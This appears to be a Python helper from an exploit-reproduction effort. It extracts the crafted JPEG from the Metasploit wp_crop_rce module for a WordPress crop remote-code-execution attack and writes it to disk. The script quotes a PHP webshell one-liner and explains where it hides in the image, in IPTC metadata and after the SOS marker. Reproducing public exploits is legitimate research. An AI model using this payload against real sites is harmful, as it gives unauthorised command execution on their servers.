#!/usr/bin/env python3
"""Extract the crafted JPEG embedded in the Metasploit wp_crop_rce module.

The image carries the PHP webshell `<?=`$_GET[0]`;?>` (a) in IPTC metadata
(APP13 / 8BIM 0x0404, survives Imagick) and (b) right after the SOS marker
(GD path).  We reuse the exact bytes shipped by the module so our hand-rolled
reproduction matches the attested public exploit.
"""
import re, sys

src = open(sys.argv[1]).read()
m = re.search(r"img_data\s*=\s*%w\[(.*?)\]\s*\n\s*img_data\s*=\s*\[img_data\.join", src, re.S)
if not m:
    sys.exit("img_data array not found")
hexbytes = re.findall(r"[0-9A-Fa-f]{2}", m.group(1))
data = bytes(int(h, 16) for h in hexbytes)
open(sys.argv[2], "wb").write(data)
print("wrote %s (%d bytes)" % (sys.argv[2], len(data)))
print("IPTC payload present:", b"<?=`$_GET[0]`;?>" in data)
